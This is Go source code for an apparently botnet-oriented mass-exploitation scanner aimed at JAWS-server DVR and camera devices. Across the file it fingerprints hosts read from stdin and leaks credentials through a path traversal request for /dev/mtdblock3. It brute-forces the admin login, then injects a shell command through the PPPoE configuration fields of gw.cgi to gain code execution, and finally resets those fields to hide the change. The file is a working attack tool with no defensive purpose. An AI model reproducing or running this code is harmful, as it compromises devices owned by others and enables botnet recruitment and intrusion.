package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"regexp"
	"runtime"
	"slices"
	"strings"
	"sync"
	"time"
)

// kira services on top
// ds : nfo.down

var (
	syncG sync.WaitGroup

	port       string
	tlsEnabled bool

	processed = 0
	found     = 0
	logins    = 0
	exploited = 0

	config = &tls.Config{
		MinVersion:         tls.VersionTLS10,
		InsecureSkipVerify: true,
	}

	dialer = &net.Dialer{Timeout: 15 * time.Second}

	fallbackPasswords = []string{
		"",
		"123456",
		"nimda",
	}
)

// getStringBetween gets a string between something.
func getStringBetween(input, start, end string) (string, error) {
	startIndex := strings.Index(input, start)
	if startIndex == -1 {
		return "", fmt.Errorf("start string not found")
	}

	startIndex += len(start)
	endIndex := strings.Index(input[startIndex:], end)
	if endIndex == -1 {
		return "", fmt.Errorf("end string not found")
	}

	return input[startIndex : startIndex+endIndex], nil
}

func authBypass(target string) []string {
	var conn net.Conn
	var err error

	if tlsEnabled {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, config)
	} else {
		conn, err = net.DialTimeout("tcp", target, 15*time.Second)
	}

	if err != nil {
		return fallbackPasswords
	}

	httpreq := []byte("GET /../../../../../dev/mtdblock3 HTTP/1.1\r\n\r\n")
	_, err = conn.Write(httpreq)
	if err != nil {
		return fallbackPasswords
	}

	alldata, err := io.ReadAll(conn)
	if err != nil && len(alldata) == 0 {
		return []string{"", "123456", "nimda"}
	}

	dataStr := string(alldata)
	if len(dataStr) > 200000 {
		dataStr = dataStr[30000:200000]
	} else if len(dataStr) > 30000 {
		dataStr = dataStr[30000:]
	}

	re := regexp.MustCompile("[^A-Za-z0-9]+")
	dataStr = strings.Join(re.Split(dataStr, -1), " ")

	result := []string{}

	for _, word := range strings.Split(dataStr, " ") {
		if !slices.Contains(result, word) && !strings.HasPrefix(word, "CAM") {
			result = append(result, word)
		}
	}

	result = append(result, fallbackPasswords...)
	return result
}

func verifyDevice(target string) error {
	var conn net.Conn
	var err error

	if tlsEnabled {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, config)
	} else {
		conn, err = net.DialTimeout("tcp", target, 15*time.Second)
	}

	if err != nil {
		return err
	}

	var request = []byte("GET / HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		"Referer: http://" + target + "/\r\n\r\n")

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return err
	}

	if !strings.Contains(string(bytes), "Server: JAWS/1.0") {
		return errors.New("not yipee")
	}

	return nil
}

func loginDevice(target, password string) error {
	var conn net.Conn
	var err error

	if tlsEnabled {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, config)
	} else {
		conn, err = net.DialTimeout("tcp", target, 15*time.Second)
	}

	if err != nil {
		return err
	}

	var request = []byte("GET /cgi-bin/gw.cgi?xml=" + url.QueryEscape("<juan ver=\"\" squ=\"\" dir=\"0\"><rpermission usr=\"admin\" pwd=\""+password+"\"><config base=\"\"/><playback base=\"\"/></rpermission></juan>") + "&_=1745034786464 HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		"Referer: http://" + target + "/\r\n\r\n")

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return err
	}

	if strings.Contains(string(bytes), "playback") {
		return nil
	}

	return errors.New("not yipee")
}

func exploit(target, password string) error {
	var conn net.Conn
	var err error

	if tlsEnabled {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, config)
	} else {
		conn, err = net.DialTimeout("tcp", target, 15*time.Second)
	}

	if err != nil {
		return err
	}

	var request = []byte("GET /cgi-bin/gw.cgi?xml=" + url.QueryEscape("<juan ver=\"0\" squ=\"abcdefg\" dir=\"0\" enc=\"1\"><envload type=\"1\" usr=\"admin\" pwd=\""+password+"\"><network pppoe=\"1\" pppoeusr=\";telnet 0.0.0.0 9\" pppoepwd=\"| sh;\"/></envload></juan>") + "&_=1745034786464 HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		"Referer: http://" + target + "/\r\n\r\n")

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return err
	}

	if strings.Contains(string(bytes), "playback") {
		return nil
	}

	return errors.New("not yipee")
}

func cleanup(target, password string) error {
	var conn net.Conn
	var err error

	if tlsEnabled {
		conn, err = tls.DialWithDialer(dialer, "tcp", target, config)
	} else {
		conn, err = net.DialTimeout("tcp", target, 15*time.Second)
	}

	if err != nil {
		return err
	}

	var request = []byte("GET /cgi-bin/gw.cgi?xml=" + url.QueryEscape("<juan ver=\"0\" squ=\"abcdefg\" dir=\"0\" enc=\"1\"><envload type=\"1\" usr=\"admin\" pwd=\""+password+"\"><network pppoe=\"1\" pppoeusr=\"root\" pppoepwd=\"root\"/></envload></juan>") + "&_=1745034786464 HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		"Referer: http://" + target + "/\r\n\r\n")

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return err
	}

	if strings.Contains(string(bytes), "playback") {
		return nil
	}

	return errors.New("not yipee")
}

func process(target string) {
	defer syncG.Done()

	processed++

	if err := verifyDevice(target); err != nil {
		return
	}

	found++
	file, err := os.OpenFile("jawsfound.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if err != nil {
		fmt.Println("Cannot create file", err)
	}
	defer file.Close()
	fmt.Fprintf(file, "%s\n", target)

	loggedIn := false
	password := ""

	for _, v := range authBypass(target) {
		if err := loginDevice(target, v); err == nil {
			loggedIn = true
			password = v
			break
		}
	}

	if !loggedIn {
		return
	}

	logins++

	// fuck a pppoe check
	exploit(target, password)
	cleanup(target, password)

	exploited++
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	flag.StringVar(&port, "port", "null", "hailshit farted so i could shit !1111")
	flag.BoolVar(&tlsEnabled, "tls", false, "enable TLS")

	flag.Parse()

	syncG.Add(1)

	// Goroutine monitoring
	go func() {
		startTime := time.Now()
		for {
			if time.Since(startTime).Minutes() > 40 {
				// After 40 minutes, check goroutine count
				if runtime.NumGoroutine() < 5 { // Adjust threshold as needed
					fmt.Println("Low goroutine count detected after 40 minutes, exiting...")
					os.Exit(0)
				}
			}
			time.Sleep(10 * time.Second) // Check every 10 seconds
		}
	}()

	// Stats goroutine
	go func() {
		var timeYipee = time.Now()

		for {
			fmt.Printf("%.0fs | %d processed | %d found | %d logins | %d exploited\r\n", time.Since(timeYipee).Seconds(), processed, found, logins, exploited)
			time.Sleep(1 * time.Second)
		}
	}()

	for scanner.Scan() {
		syncG.Add(1)

		if port == "null" {
			go process(scanner.Text())
		} else {
			go process(scanner.Text() + ":" + port)
		}
	}

	syncG.Wait()
}
